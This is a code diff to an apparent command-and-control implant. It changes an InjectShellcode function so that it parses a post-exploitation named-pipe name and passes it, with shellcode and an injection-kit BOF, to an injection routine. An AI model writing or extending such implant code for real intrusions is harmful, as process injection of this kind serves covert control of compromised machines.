@@ -23,6 +23,7 @@ VOID InjectShellcode(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
     PBYTE  Shellcode              = NULL;
     PCHAR  injectKitBof           = NULL;
     SIZE_T scLength               = 0;
+    SIZE_T pipeNameLen            = 0;
     SIZE_T kitLen                 = 0;
     PCHAR  Output                 = NULL;
     SIZE_T OutLen                 = 0;
@@ -37,6 +38,16 @@ VOID InjectShellcode(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
         return;
     }
     
+    /* Get Named Pipe */
+    PCHAR PostexPipename = ParserGetString(arguments, &pipeNameLen);
+    if ( PostexPipename == NULL || pipeNameLen == 0 )
+    {
+        _err("Failed to parse postex pipename from arguments.");
+        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
+        return;
+    }
+    _dbg("[+] Using Postex Named Pipe: %s", PostexPipename);
+
     /* Get shellcode bytes */
     PCHAR shellcodeData = ParserGetString(arguments, &scLength);
 
@@ -58,7 +69,7 @@ VOID InjectShellcode(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
     _dbg("[+] Using Process Injection Kit. %d bytes", kitLen);
 
     /* Inject shellcode ( default | custom kit ) */
-    if ( !InjectShellcodeViaKit(Shellcode, scLength, injectKitBof, kitLen, &Output, &OutLen) )
+    if ( !InjectShellcodeViaKit(PostexPipename, Shellcode, scLength, injectKitBof, kitLen, &Output, &OutLen) )
     {
         DWORD error = GetLastError();
         _err("[!] Failed to inject with kit. ERROR : %d\n", error);
